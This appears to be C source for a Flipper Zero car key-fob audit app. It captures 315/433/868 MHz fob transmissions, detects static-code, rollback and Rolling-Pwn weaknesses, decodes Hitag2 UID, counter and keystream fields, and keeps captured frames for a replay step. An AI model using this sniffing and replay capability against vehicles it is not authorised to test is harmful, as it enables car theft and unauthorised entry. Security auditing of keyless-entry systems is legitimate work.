#include <furi.h>
#include <furi_hal.h>
#include <furi/core/kernel.h>
#include <furi/core/timer.h>
#include <gui/gui.h>
#include <gui/view.h>
#include <gui/view_dispatcher.h>
#include <gui/elements.h>
#include <gui/modules/submenu.h>
#include <gui/modules/dialog_ex.h>
#include <input/input.h>
#include <storage/storage.h>
#include <lib/subghz/subghz_worker.h>
#include <toolbox/level_duration.h>
#include <toolbox/crc32_calc.h>
#include <notification/notification_messages.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <math.h>

#include "scenes/car_breaker19_scene_about.h"
#include "car_breaker_audit.h"

#define TAG "CarBreaker19"

#define CAR_BREAKER_MAX_PULSES 512
#define CAR_BREAKER_MAX_FRAMES 512
#define CAR_BREAKER_MIN_PULSES 32
#define CAR_BREAKER_PACKET_GAP_US 4000
#define CAR_BREAKER_MAX_PULSE_US 30000
#define CAR_BREAKER_ROLLING_WINDOW_MS 2500
#define CAR_BREAKER_ROLLBACK_GAP_MS 8000
#define CAR_BREAKER_STATUS_MSG_LEN 64
#define KEY_DEBOUNCE_MS 300
#define CAR_BREAKER_ROLLING_SEQUENCE_LEN 5
#define CAR_BREAKER_MIN_FRAME_BITS 40
#define CAR_BREAKER_MAX_FRAME_BITS 160
#define CAR_BREAKER_MIN_FRAME_DURATION_US 3000
#define CAR_BREAKER_MAX_FRAME_DURATION_US 14000
#define CAR_BREAKER_CONSISTENCY_TOLERANCE_PERCENT 18
#define CAR_BREAKER_MAX_BIT_COUNT (CAR_BREAKER_MAX_PULSES / 2)
#define CAR_BREAKER_HITAG2_MIN_BITS 100
#define CAR_BREAKER_HITAG2_MAX_BITS 128
#define CAR_BREAKER_HITAG2_WINDOW 16
#define CAR_BREAKER_HITAG2_MIN_SAMPLES 4
#define CAR_BREAKER_HITAG2_ENTROPY_WARN 7.0f
#define CAR_BREAKER_HITAG2_ENTROPY_CRIT 4.0f

typedef struct CarBreakerApp CarBreakerApp;

typedef enum {
    CarBreakerRegionUSA = 0,
    CarBreakerRegionEU,
    CarBreakerRegionEU868,
} CarBreakerRegion;

typedef enum {
    CarBreakerProfileHondaLegacy = 0,
    CarBreakerProfileHondaModern,
    CarBreakerProfileMiniCas3,
} CarBreakerProfile;

typedef struct {
    uint32_t duration;
    uint8_t level;
} CarBreakerPulse;

typedef struct {
    uint32_t uid;
    uint16_t counter_low;
    uint8_t button;
    uint32_t keystream;
    uint8_t pad_bits;
    uint8_t checksum;
    bool checksum_valid;
} CarBreakerHitag2Decoded;

typedef struct {
    uint32_t keystream;
    uint16_t counter_low;
} CarBreakerHitag2Sample;

typedef struct {
    uint32_t timestamp_ms;
    uint32_t hash;
    uint16_t pulse_count;
    uint16_t approx_bits;
    uint32_t duration_us;
    uint8_t preset_index;
    bool hitag2_decoded;
    bool hitag2_checksum_valid;
    uint32_t hitag2_uid;
    uint16_t hitag2_counter_low;
    uint8_t hitag2_button;
    uint32_t hitag2_keystream;
} CarBreakerFrame;

typedef struct {
    CarBreakerFrame frames[CAR_BREAKER_MAX_FRAMES];
    size_t count;
} CarBreakerSession;

typedef struct {
    bool static_code_detected;
    uint32_t static_hash;
    uint32_t static_first_ms;
    uint32_t static_second_ms;
    bool rollback_detected;
    uint32_t rollback_hash;
    uint32_t rollback_gap_ms;
    bool rolling_pwn_detected;
    uint32_t rolling_window_ms;
    bool hitag2_activity;
    bool hitag2_entropy_low;
    bool hitag2_entropy_critical;
    bool hitag2_keystream_repeat;
    bool hitag2_counter_regression;
    bool hitag2_key_exposure_risk; // >= 4 valid frames from one UID: published key-recovery precondition
    uint8_t hitag2_window_size;
    uint16_t hitag2_uid_frame_count;
    uint32_t hitag2_uid;
    uint16_t hitag2_last_counter;
    uint32_t hitag2_last_keystream;
    float hitag2_entropy_bits_per_byte;
} CarBreakerAnalysis;

typedef struct {
    const char* name;
    uint32_t frequency;
    const uint8_t* regs;
    size_t regs_size;
    const char* description;
} CarBreakerPreset;

static void car_breaker_start_capture(CarBreakerApp* app);
static void car_breaker_stop_capture(CarBreakerApp* app);
static void car_breaker_audit_finish_capture(CarBreakerApp* app);
static void car_breaker_audit_render(CarBreakerApp* app);
static bool car_breaker_try_decode_hitag2(
    CarBreakerFrame* frame,
    const CarBreakerPulse* pulses,
    uint16_t pulse_count);
static float car_breaker_compute_entropy_bits_per_byte(const uint16_t* hist, uint16_t total_bytes);
static void car_breaker_show_region_menu(CarBreakerApp* app);
static void car_breaker_show_profile_menu(CarBreakerApp* app);
static void car_breaker_region_menu_callback(void* context, uint32_t index);
static void car_breaker_profile_menu_callback(void* context, uint32_t index);
static uint32_t car_breaker_region_previous_callback(void* context);
static uint32_t car_breaker_profile_previous_callback(void* context);

static const uint8_t car_breaker_preset_hnd1[] = {
    0x02, 0x0D, 0x0B, 0x06, 0x08, 0x32, 0x07, 0x04, 0x14, 0x00, 0x13, 0x02,
    0x12, 0x04, 0x11, 0x36, 0x10, 0x69, 0x15, 0x32, 0x18, 0x18, 0x19, 0x16,
    0x1D, 0x91, 0x1C, 0x00, 0x1B, 0x07, 0x20, 0xFB, 0x22, 0x10, 0x21, 0x56,
    0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static const uint8_t car_breaker_preset_hnd2[] = {
    0x02, 0x0D, 0x0B, 0x06, 0x08, 0x32, 0x07, 0x04, 0x14, 0x00, 0x13, 0x02,
    0x12, 0x07, 0x11, 0x36, 0x10, 0xE9, 0x15, 0x32, 0x18, 0x18, 0x19, 0x16,
    0x1D, 0x92, 0x1C, 0x40, 0x1B, 0x03, 0x20, 0xFB, 0x22, 0x10, 0x21, 0x56,
    0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
};

static const CarBreakerPreset car_breaker_presets[] = {
    {
        .name = "433 Wide",
        .frequency = 433920000,
        .regs = car_breaker_preset_hnd1,
        .regs_size = sizeof(car_breaker_preset_hnd1),
        .description = "433.92 MHz wide filter",
    },
    {
        .name = "433 Narrow",
        .frequency = 433920000,
        .regs = car_breaker_preset_hnd2,
        .regs_size = sizeof(car_breaker_preset_hnd2),
        .description = "433.92 MHz narrow filter",
    },
    {
        .name = "315 Wide",
        .frequency = 315000000,
        .regs = car_breaker_preset_hnd1,
        .regs_size = sizeof(car_breaker_preset_hnd1),
        .description = "315 MHz wide filter",
    },
    {
        .name = "315 Narrow",
        .frequency = 315000000,
        .regs = car_breaker_preset_hnd2,
        .regs_size = sizeof(car_breaker_preset_hnd2),
        .description = "315 MHz narrow filter",
    },
    {
        .name = "868 Wide",
        .frequency = 868350000,
        .regs = car_breaker_preset_hnd1,
        .regs_size = sizeof(car_breaker_preset_hnd1),
        .description = "868.35 MHz wide filter",
    },
    {
        .name = "868 Narrow",
        .frequency = 868350000,
        .regs = car_breaker_preset_hnd2,
        .regs_size = sizeof(car_breaker_preset_hnd2),
        .description = "868.35 MHz narrow filter",
    },
};

#define CAR_BREAKER_PRESETS_COUNT (COUNT_OF(car_breaker_presets))

static const char* car_breaker_region_names[] = {
    "USA 315 MHz",
    "EU 433.92 MHz",
    "EU 868 MHz",
};

static const char* car_breaker_profile_names[] = {
    "Honda Legacy (HND1)",
    "Honda Modern (HND2)",
    "Mini CAS3 Hitag2",
};

typedef enum {
    CarBreakerViewSplash,
    CarBreakerViewMenu,
    CarBreakerViewCapture,
    CarBreakerViewAbout,
    CarBreakerViewRegionSelect,
    CarBreakerViewProfileSelect,
    CarBreakerViewAuditSelect,
    CarBreakerViewAudit,
    CarBreakerViewKnown,
    CarBreakerViewKnownDetail,
} CarBreakerView;

typedef enum {
    CarBreakerMenuStart,
    CarBreakerMenuGuidedAudit,
    CarBreakerMenuKnownIssues,
    CarBreakerMenuExportSession,
    CarBreakerMenuAbout,
} CarBreakerMenuIndex;

// Guided audit flow steps. Capture reuses the passive RX engine; everything
// from TxConfirm on transmits frames retained earlier in the same session.
typedef enum {
    CarBreakerAuditStepAuth,
    CarBreakerAuditStepBrief,
    CarBreakerAuditStepCapture,
    CarBreakerAuditStepPrepare,
    CarBreakerAuditStepTxConfirm,
    CarBreakerAuditStepTxRunning,
    CarBreakerAuditStepObserve,
    CarBreakerAuditStepVerdict,
} CarBreakerAuditStep;

struct CarBreakerApp {
    Gui* gui;
    ViewDispatcher* view_dispatcher;
    Submenu* submenu;
    Submenu* region_menu;
    Submenu* profile_menu;
    Submenu* audit_menu;
    Submenu* known_menu;
    DialogEx* splash_dialog;
    DialogEx* capture_dialog;
    DialogEx* audit_dialog;
    DialogEx* known_dialog;
    View* about_view;
    NotificationApp* notifications;
    char capture_header[40];
    char capture_text[128];
    char audit_text[256];

    FuriMutex* lock;
    SubGhzWorker* worker;
    FuriTimer* ui_timer;

    CarBreakerSession session;
    CarBreakerAnalysis analysis;
    CarBreakerPulse pulses[CAR_BREAKER_MAX_PULSES];
    uint16_t pulse_count;

    CarBreakerAuditState* audit;
    CarBreakerAuditStep audit_step;
    CarBreakerAuditTest audit_test;
    uint8_t audit_known_index;
    bool audit_tx_busy;

    uint8_t current_preset_index;
    CarBreakerRegion selected_region;
    CarBreakerProfile selected_profile;
    bool selection_ready;
    bool pending_capture;
    bool capturing;
    bool capture_dirty;
    bool overrun;
    bool is_view_transitioning;
    uint32_t last_key_event_time;
    char status_message[CAR_BREAKER_STATUS_MSG_LEN];
    CarBreakerView active_view;
};

static bool car_breaker_is_key_debounced(CarBreakerApp* app) {
    if(!app) return false;
    uint32_t current_time = furi_get_tick();
    if(current_time - app->last_key_event_time < KEY_DEBOUNCE_MS) {
        return false;
    }
    app->last_key_event_time = current_time;
    return true;
}

static void car_breaker_safe_switch_view(CarBreakerApp* app, CarBreakerView view) {
    if(!app || !app->view_dispatcher) return;
    if(app->is_view_transitioning) return;

    app->is_view_transitioning = true;
    app->active_view = view;
    view_dispatcher_switch_to_view(app->view_dispatcher, view);
    app->is_view_transitioning = false;
}

static void car_breaker_update_status(CarBreakerApp* app, const char* text) {
    furi_check(app);
    if(!text) return;
    furi_mutex_acquire(app->lock, FuriWaitForever);
    snprintf(app->status_message, CAR_BREAKER_STATUS_MSG_LEN, "%s", text);
    app->capture_dirty = true;
    furi_mutex_release(app->lock);
}

static uint32_t car_breaker_hash_pulses(const CarBreakerPulse* pulses, size_t count) {
    uint32_t crc = 0;
    for(size_t i = 0; i < count; i++) {
        crc = crc32_calc_buffer(crc, &pulses[i].duration, sizeof(pulses[i].duration));
        crc = crc32_calc_buffer(crc, &pulses[i].level, sizeof(pulses[i].level));
    }
    return crc;
}

static void car_breaker_reset_session_locked(CarBreakerApp* app) {
    app->session.count = 0;
    memset(&app->analysis, 0, sizeof(app->analysis));
    app->pulse_count = 0;
    app->capture_dirty = true;
}

static bool car_breaker_frame_is_valid(const CarBreakerFrame* frame) {
    if(!frame) return false;
    if(frame->approx_bits < CAR_BREAKER_MIN_FRAME_BITS ||
       frame->approx_bits > CAR_BREAKER_MAX_FRAME_BITS) {
        return false;
    }
    if(frame->duration_us < CAR_BREAKER_MIN_FRAME_DURATION_US ||
       frame->duration_us > CAR_BREAKER_MAX_FRAME_DURATION_US) {
        return false;
    }
    return true;
}

static uint32_t car_breaker_percent_delta(uint32_t baseline, uint32_t value) {
    if(baseline == 0) return UINT32_MAX;
    uint32_t diff = (baseline > value) ? (baseline - value) : (value - baseline);
    return (diff * 100u) / baseline;
}

static float car_breaker_log2_approx(float value) {
    if(value <= 0.0f) {
        return 0.0f;
    }
    return logf(value) / 0.6931471805599453f;
}

static uint64_t car_breaker_bits_to_value_msb(const uint8_t* bits, size_t count) {
    uint64_t value = 0;
    for(size_t i = 0; i < count; i++) {
        value = (value << 1) | (bits[i] ? 1u : 0u);
    }
    return value;
}

static uint64_t car_breaker_bits_to_value_lsb(const uint8_t* bits, size_t count) {
    uint64_t value = 0;
    for(size_t i = 0; i < count; i++) {
        if(bits[i]) {
            value |= (1ULL << i);
        }
    }
    return value;
}

static bool car_breaker_extract_hitag2_bits(
    const CarBreakerPulse* pulses,
    uint16_t pulse_count,
    uint8_t* bit_buffer,
    size_t* bit_count_out) {
    if(pulse_count < CAR_BREAKER_HITAG2_MIN_BITS * 2 || (pulse_count % 2) != 0 ||
       pulse_count > CAR_BREAKER_MAX_BIT_COUNT * 2) {
        return false;
    }

    uint64_t duration_total = 0;
    for(uint16_t i = 0; i < pulse_count; i++) {
        duration_total += pulses[i].duration;
    }
    if(duration_total == 0) {
        return false;
    }

    uint32_t avg_half = duration_total / pulse_count;
    if(avg_half < 80 || avg_half > 3000) {
        return false;
    }
    uint32_t min_allowed = (avg_half > 40) ? (avg_half - avg_half / 2) : 0;
    uint32_t max_allowed = avg_half + avg_half / 2 + 150;

    size_t bits_written = 0;
    for(uint16_t i = 0; i + 1 < pulse_count; i += 2) {
        const CarBreakerPulse* first = &pulses[i];
        const CarBreakerPulse* second = &pulses[i + 1];

        if(first->level == second->level) {
            return false;
        }

        if(first->duration < min_allowed || first->duration > max_allowed ||
           second->duration < min_allowed || second->duration > max_allowed) {
            return false;
        }

        if(bits_written >= CAR_BREAKER_MAX_BIT_COUNT) {
            return false;
        }

        if(first->level == 1 && second->level == 0) {
            bit_buffer[bits_written++] = 1;
        } else if(first->level == 0 && second->level == 1) {
            bit_buffer[bits_written++] = 0;
        } else {
            return false;
        }
    }

    if(bits_written < CAR_BREAKER_HITAG2_MIN_BITS || bits_written > CAR_BREAKER_HITAG2_MAX_BITS) {
        return false;
    }

    *bit_count_out = bits_written;
    return true;
}

static bool car_breaker_parse_hitag2_from_offset(
    const uint8_t* bits,
    size_t available_bits,
    CarBreakerHitag2Decoded* decoded) {
    if(available_bits < 104) {
        return false;
    }

    uint16_t sync = (uint16_t)car_breaker_bits_to_value_msb(bits, 16);
    if(!(sync == 0x0001u || sync == 0x5555u || sync == 0xAAAAu)) {
        return false;
    }

    const uint8_t* payload = bits + 16;
    const size_t payload_bits = 88;

    uint32_t uid = (uint32_t)car_breaker_bits_to_value_msb(payload, 32);
    uint8_t button = (uint8_t)car_breaker_bits_to_value_msb(payload + 32, 4);
    uint16_t counter_low = (uint16_t)car_breaker_bits_to_value_msb(payload + 36, 10);
    uint32_t keystream = (uint32_t)car_breaker_bits_to_value_lsb(payload + 46, 32);
    uint8_t pad_bits = (uint8_t)car_breaker_bits_to_value_msb(payload + 78, 2);
    uint8_t checksum = (uint8_t)car_breaker_bits_to_value_msb(payload + 80, 8);

    uint8_t payload_bytes[11] = {0};
    for(size_t i = 0; i < payload_bits; i++) {
        size_t byte_idx = i / 8;
        payload_bytes[byte_idx] = (payload_bytes[byte_idx] << 1) | (payload[i] ? 1u : 0u);
    }

    uint8_t calculated = 0;
    for(size_t i = 0; i < 10; i++) {
        calculated ^= payload_bytes[i];
    }

    decoded->uid = uid;
    decoded->button = button;
    decoded->counter_low = counter_low;
    decoded->keystream = keystream;
    decoded->pad_bits = pad_bits;
    decoded->checksum = checksum;
    decoded->checksum_valid = (pad_bits == 0b10u) && (calculated == checksum);

    return true;
}

static bool car_breaker_try_decode_hitag2(
    CarBreakerFrame* frame,
    const CarBreakerPulse* pulses,
    uint16_t pulse_count) {
    if(!frame || !pulses || pulse_count < CAR_BREAKER_HITAG2_MIN_BITS * 2) {
        return false;
    }

    uint8_t bit_buffer[CAR_BREAKER_MAX_BIT_COUNT] = {0};
    size_t bit_count = 0;
    if(!car_breaker_extract_hitag2_bits(pulses, pulse_count, bit_buffer, &bit_count)) {
        return false;
    }

    for(size_t offset = 0; offset + 104 <= bit_count; offset++) {
        CarBreakerHitag2Decoded decoded = {0};
        if(car_breaker_parse_hitag2_from_offset(&bit_buffer[offset], bit_count - offset, &decoded)) {
            frame->hitag2_decoded = true;
            frame->hitag2_checksum_valid = decoded.checksum_valid;
            frame->hitag2_uid = decoded.uid;
            frame->hitag2_counter_low = decoded.counter_low;
            frame->hitag2_button = decoded.button;
            frame->hitag2_keystream = decoded.keystream;
            return true;
        }
    }

    return false;
}

static float car_breaker_compute_entropy_bits_per_byte(const uint16_t* hist, uint16_t total_bytes) {
    if(!hist || total_bytes == 0) {
        return 0.0f;
    }
    float entropy = 0.0f;
    for(uint16_t i = 0; i < 256; i++) {
        if(hist[i] == 0) continue;
        float probability = (float)hist[i] / (float)total_bytes;
        entropy -= probability * car_breaker_log2_approx(probability);
    }
    return entropy;
}

static uint8_t car_breaker_select_preset_index(CarBreakerRegion region, CarBreakerProfile profile) {
    const bool narrow = (profile != CarBreakerProfileHondaLegacy);
    if(region == CarBreakerRegionUSA) {
        return narrow ? 3 : 2;
    } else if(region == CarBreakerRegionEU) {
        return narrow ? 1 : 0;
    } else { // CarBreakerRegionEU868
        return narrow ? 5 : 4;
    }
}

static void car_breaker_show_region_menu(CarBreakerApp* app) {
    if(!app) return;
    submenu_set_selected_item(app->region_menu, app->selected_region);
    car_breaker_safe_switch_view(app, CarBreakerViewRegionSelect);
}

static void car_breaker_show_profile_menu(CarBreakerApp* app) {
    if(!app) return;
    submenu_set_selected_item(app->profile_menu, app->selected_profile);
    car_breaker_safe_switch_view(app, CarBreakerViewProfileSelect);
}

static void car_breaker_region_menu_callback(void* context, uint32_t index) {
    CarBreakerApp* app = context;
    if(index >= COUNT_OF(car_breaker_region_names)) {
        index = 0;
    }
    app->selected_region = (CarBreakerRegion)index;
    car_breaker_show_profile_menu(app);
}

static void car_breaker_profile_menu_callback(void* context, uint32_t index) {
    CarBreakerApp* app = context;
    if(index >= COUNT_OF(car_breaker_profile_names)) {
        index = 0;
    }
    app->selected_profile = (CarBreakerProfile)index;
    app->current_preset_index =
        car_breaker_select_preset_index(app->selected_region, app->selected_profile);
    app->selection_ready = true;
    bool start_now = app->pending_capture;
    app->pending_capture = false;
    if(start_now) {
        car_breaker_start_capture(app);
        car_breaker_safe_switch_view(app, CarBreakerViewCapture);
    } else {
        car_breaker_safe_switch_view(app, CarBreakerViewMenu);
    }
}

static uint32_t car_breaker_region_previous_callback(void* context) {
    CarBreakerApp* app = context;
    app->pending_capture = false;
    return CarBreakerViewMenu;
}

static uint32_t car_breaker_profile_previous_callback(void* context) {
    UNUSED(context);
    return CarBreakerViewRegionSelect;
}

static bool car_breaker_frames_consistent(
    const CarBreakerFrame* reference,
    const CarBreakerFrame* candidate) {
    if(!reference || !candidate) return false;
    if(!car_breaker_frame_is_valid(reference) || !car_breaker_frame_is_valid(candidate)) {
        return false;
    }
    if(reference->preset_index != candidate->preset_index) {
        return false;
    }

    uint32_t duration_delta =
        car_breaker_percent_delta(reference->duration_us, candidate->duration_us);
    uint32_t bit_delta = car_breaker_percent_delta(reference->approx_bits, candidate->approx_bits);

    if(duration_delta > CAR_BREAKER_CONSISTENCY_TOLERANCE_PERCENT) return false;
    if(bit_delta > CAR_BREAKER_CONSISTENCY_TOLERANCE_PERCENT) return false;
    return true;
}

static void car_breaker_recompute_analysis_locked(CarBreakerApp* app) {
    CarBreakerAnalysis updated = {0};
    const CarBreakerSession* session = &app->session;
    CarBreakerHitag2Sample hitag2_samples[CAR_BREAKER_HITAG2_WINDOW] = {0};
    size_t hitag2_sample_count = 0;
    bool hitag2_uid_set = false;
    uint32_t hitag2_uid = 0;
    uint16_t hitag2_uid_frame_count = 0;

    for(size_t idx = 0; idx < session->count; idx++) {
        const CarBreakerFrame* frame = &session->frames[idx];
        const bool frame_valid = car_breaker_frame_is_valid(frame);

        if(frame->hitag2_decoded && frame->hitag2_checksum_valid) {
            if(!hitag2_uid_set) {
                hitag2_uid = frame->hitag2_uid;
                hitag2_uid_set = true;
            }
            if(frame->hitag2_uid == hitag2_uid) {
                hitag2_uid_frame_count++;
                if(hitag2_sample_count == CAR_BREAKER_HITAG2_WINDOW) {
                    memmove(
                        &hitag2_samples[0],
                        &hitag2_samples[1],
                        (CAR_BREAKER_HITAG2_WINDOW - 1) * sizeof(CarBreakerHitag2Sample));
                    hitag2_sample_count--;
                }
                hitag2_samples[hitag2_sample_count].keystream = frame->hitag2_keystream;
                hitag2_samples[hitag2_sample_count].counter_low = frame->hitag2_counter_low;
                hitag2_sample_count++;
            }
        }

        if(!updated.rolling_pwn_detected &&
           (idx + 1u) >= CAR_BREAKER_ROLLING_SEQUENCE_LEN &&
           frame_valid) {
            size_t start_idx = idx + 1 - CAR_BREAKER_ROLLING_SEQUENCE_LEN;
            const CarBreakerFrame* start_frame = &session->frames[start_idx];
            if(car_breaker_frame_is_valid(start_frame)) {
                uint32_t window = frame->timestamp_ms - start_frame->timestamp_ms;
                if(window <= CAR_BREAKER_ROLLING_WINDOW_MS) {
                    bool consistent = true;
                    bool unique_hashes = true;

                    for(size_t i = start_idx; i <= idx && consistent; i++) {
                        const CarBreakerFrame* candidate = &session->frames[i];
                        if(!car_breaker_frames_consistent(start_frame, candidate)) {
                            consistent = false;
                        }
                    }

                    if(consistent) {
                        for(size_t i = start_idx; i < idx && unique_hashes; i++) {
                            for(size_t j = i + 1; j <= idx && unique_hashes; j++) {
                                if(session->frames[i].hash == session->frames[j].hash) {
                                    unique_hashes = false;
                                }
                            }
                        }
                    }

                    if(consistent && unique_hashes) {
                        updated.rolling_pwn_detected = true;
                        updated.rolling_window_ms = window;
                    }
                }
            }
        }

        if(!frame_valid) continue;

        for(size_t older_idx = 0; older_idx < idx; older_idx++) {
            const CarBreakerFrame* older = &session->frames[older_idx];
            if(older->hash != frame->hash) continue;
            if(!car_breaker_frames_consistent(frame, older)) continue;

            uint32_t gap = frame->timestamp_ms - older->timestamp_ms;
            if(!updated.static_code_detected) {
                updated.static_code_detected = true;
                updated.static_hash = frame->hash;
                updated.static_first_ms = older->timestamp_ms;
                updated.static_second_ms = frame->timestamp_ms;
            }
            if(!updated.rollback_detected && gap >= CAR_BREAKER_ROLLBACK_GAP_MS) {
                updated.rollback_detected = true;
                updated.rollback_hash = frame->hash;
                updated.rollback_gap_ms = gap;
            }
        }
    }

    if(hitag2_sample_count >= CAR_BREAKER_HITAG2_MIN_SAMPLES) {
        uint16_t hist[256] = {0};
        bool keystream_repeat = false;
        bool counter_regression = false;

        for(size_t i = 0; i < hitag2_sample_count; i++) {
            uint32_t ks = hitag2_samples[i].keystream;
            for(uint8_t byte_idx = 0; byte_idx < 4; byte_idx++) {
                uint8_t byte = (ks >> (byte_idx * 8)) & 0xFF;
                hist[byte]++;
            }

            if(i > 0 && hitag2_samples[i].counter_low <= hitag2_samples[i - 1].counter_low) {
                counter_regression = true;
            }

            for(size_t j = 0; j < i; j++) {
                if(hitag2_samples[j].keystream == ks &&
                   hitag2_samples[j].counter_low != hitag2_samples[i].counter_low) {
                    keystream_repeat = true;
                    break;
                }
            }
        }

        uint16_t total_bytes = hitag2_sample_count * 4;
        float entropy = car_breaker_compute_entropy_bits_per_byte(hist, total_bytes);
        updated.hitag2_activity = true;
        updated.hitag2_uid = hitag2_uid;
        updated.hitag2_window_size = hitag2_sample_count;
        updated.hitag2_uid_frame_count = hitag2_uid_frame_count;
        // Published correlation attacks recover a Hitag2 key from 4-8 sniffed
        // frames of one fob; surface that exposure once enough samples exist.
        updated.hitag2_key_exposure_risk = (hitag2_uid_frame_count >= 4);
        updated.hitag2_entropy_bits_per_byte = entropy;
        updated.hitag2_entropy_low =
            (entropy > 0.0f) && (entropy < CAR_BREAKER_HITAG2_ENTROPY_WARN);
        updated.hitag2_entropy_critical =
            (entropy > 0.0f) && (entropy < CAR_BREAKER_HITAG2_ENTROPY_CRIT);
        updated.hitag2_keystream_repeat = keystream_repeat;
        updated.hitag2_counter_regression = counter_regression;
        updated.hitag2_last_counter = hitag2_samples[hitag2_sample_count - 1].counter_low;
        updated.hitag2_last_keystream = hitag2_samples[hitag2_sample_count - 1].keystream;
    }

    app->analysis = updated;
}

static void car_breaker_finalize_frame_locked(CarBreakerApp* app) {
    if(app->pulse_count < CAR_BREAKER_MIN_PULSES) {
        app->pulse_count = 0;
        return;
    }

    CarBreakerSession* session = &app->session;
    if(session->count >= CAR_BREAKER_MAX_FRAMES) {
        memmove(
            &session->frames[0],
            &session->frames[1],
            (CAR_BREAKER_MAX_FRAMES - 1) * sizeof(CarBreakerFrame));
        session->count = CAR_BREAKER_MAX_FRAMES - 1;
    }

    uint16_t recorded_pulses = app->pulse_count;

    CarBreakerFrame* frame = &session->frames[session->count++];
    memset(frame, 0, sizeof(CarBreakerFrame));
    frame->timestamp_ms = furi_get_tick();
    frame->pulse_count = recorded_pulses;
    frame->hash = car_breaker_hash_pulses(app->pulses, app->pulse_count);
    frame->preset_index = app->current_preset_index;

    uint64_t duration_sum = 0;
    for(size_t i = 0; i < recorded_pulses; i++) {
        duration_sum += app->pulses[i].duration;
    }
    if(duration_sum > UINT32_MAX) duration_sum = UINT32_MAX;
    frame->duration_us = (uint32_t)duration_sum;
    frame->approx_bits = (uint16_t)(duration_sum / 65);
    if(frame->approx_bits == 0) {
        frame->approx_bits = 1;
    }

    car_breaker_try_decode_hitag2(frame, app->pulses, recorded_pulses);

    // Retain the raw frame for guided-audit replay. Only frames that pass
    // the same validity gate as the analysis engines are worth replaying.
    if(car_breaker_frame_is_valid(frame)) {
        uint32_t signed_durations[CAR_BREAKER_AUDIT_MAX_PULSES];
        uint16_t retain_count =
            (recorded_pulses < CAR_BREAKER_AUDIT_MAX_PULSES) ? recorded_pulses :
                                                               CAR_BREAKER_AUDIT_MAX_PULSES;
        for(uint16_t i = 0; i < retain_count; i++) {
            int64_t signed_duration =
                app->pulses[i].level ? (int64_t)app->pulses[i].duration : -(int64_t)app->pulses[i].duration;
            signed_durations[i] = (int32_t)signed_duration;
        }
        car_breaker_audit_retain(
            app->audit,
            signed_durations,
            retain_count,
            frame->timestamp_ms,
            frame->hash,
            frame->preset_index);
    }

    app->pulse_count = 0;
    app->capture_dirty = true;
    car_breaker_recompute_analysis_locked(app);
}

static void car_breaker_worker_overrun_callback(void* context) {
    CarBreakerApp* app = context;
    app->overrun = true;
}

static void car_breaker_worker_pair_callback(void* context, bool level, uint32_t duration) {
    CarBreakerApp* app = context;
    if(!app->capturing) return;

    if(duration > CAR_BREAKER_MAX_PULSE_US) duration = CAR_BREAKER_MAX_PULSE_US;

    furi_mutex_acquire(app->lock, FuriWaitForever);

    if(app->pulse_count >= CAR_BREAKER_MAX_PULSES) {
        car_breaker_finalize_frame_locked(app);
    }

    if(app->pulse_count < CAR_BREAKER_MAX_PULSES) {
        CarBreakerPulse* pulse = &app->pulses[app->pulse_count++];
        pulse->duration = duration;
        pulse->level = level ? 1 : 0;
    }

    if(!level && duration >= CAR_BREAKER_PACKET_GAP_US) {
        car_breaker_finalize_frame_locked(app);
    }

    furi_mutex_release(app->lock);
}

static void car_breaker_update_capture_display(CarBreakerApp* app) {
    size_t frame_count = 0;
    CarBreakerAnalysis analysis = {0};
    bool capturing = false;
    bool selection_ready = false;
    CarBreakerRegion region = CarBreakerRegionUSA;
    CarBreakerProfile profile = CarBreakerProfileHondaLegacy;

    furi_mutex_acquire(app->lock, FuriWaitForever);
    frame_count = app->session.count;
    analysis = app->analysis;
    capturing = app->capturing;
    selection_ready = app->selection_ready;
    region = app->selected_region;
    profile = app->selected_profile;
    furi_mutex_release(app->lock);

    bool any_detected = analysis.static_code_detected ||
                        analysis.rollback_detected ||
                        analysis.rolling_pwn_detected;

    if(capturing && any_detected) {
        car_breaker_stop_capture(app);
        capturing = false;
    }

    // Header is just "Scanning"
    dialog_ex_set_header(app->capture_dialog, "Scanning", 64, 2, AlignCenter, AlignTop);

    char* ptr = app->capture_text;
    size_t remaining = sizeof(app->capture_text);
    int written = 0;

    if(selection_ready && region < COUNT_OF(car_breaker_region_names) &&
       profile < COUNT_OF(car_breaker_profile_names)) {
        written = snprintf(
            ptr,
            remaining,
            "%s\n%s\n",
            car_breaker_region_names[region],
            car_breaker_profile_names[profile]);
    } else {
        written = snprintf(ptr, remaining, "Select target in menu\n");
    }
    ptr += written;
    remaining -= written;

    if(any_detected) {
        if(analysis.rolling_pwn_detected && remaining > 0) {
            written = snprintf(ptr, remaining, "Rolling-Pwn DETECTED!\n");
            ptr += written;
            remaining -= written;
            if(analysis.rolling_window_ms && remaining > 0) {
                written = snprintf(
                    ptr,
                    remaining,
                    "Window: %lums\n",
                    (unsigned long)analysis.rolling_window_ms);
                ptr += written;
                remaining -= written;
            }
        }
        if(analysis.rollback_detected && remaining > 0) {
            written = snprintf(ptr, remaining, "RollBack SUSPECT!\n");
            ptr += written;
            remaining -= written;
        }
        if(analysis.static_code_detected && remaining > 0) {
            snprintf(ptr, remaining, "Static Code DETECTED!");
        }
    } else {
        if(remaining > 0) {
            written = snprintf(
                ptr,
                remaining,
                "Frame Buffer %u/%u\n",
                (unsigned)frame_count,
                (unsigned)CAR_BREAKER_MAX_FRAMES);
            ptr += written;
            remaining -= written;
        }
        if(frame_count == 0) {
            snprintf(ptr, remaining, "Waiting for signal...");
        } else {
            snprintf(ptr, remaining, "Analyzing...");
        }
    }

    if(analysis.hitag2_activity && remaining > 0) {
        written = snprintf(
            ptr,
            remaining,
            "Mini UID:%08lX (%u)\n",
            (unsigned long)analysis.hitag2_uid,
            (unsigned)analysis.hitag2_window_size);
        ptr += written;
        remaining -= written;
    }

    if(analysis.hitag2_activity && remaining > 0) {
        const char* entropy_label = analysis.hitag2_entropy_critical    ? "CRIT"
                                     : analysis.hitag2_entropy_low     ? "LOW"
                                     : "OK";
        written = snprintf(
            ptr,
            remaining,
            "KS H=%.2f (%s)\n",
            (double)analysis.hitag2_entropy_bits_per_byte,
            entropy_label);
        ptr += written;
        remaining -= written;
    }

    if(analysis.hitag2_keystream_repeat && remaining > 0) {
        written = snprintf(ptr, remaining, "KS repeat detected!\n");
        ptr += written;
        remaining -= written;
    }

    if(analysis.hitag2_counter_regression && remaining > 0) {
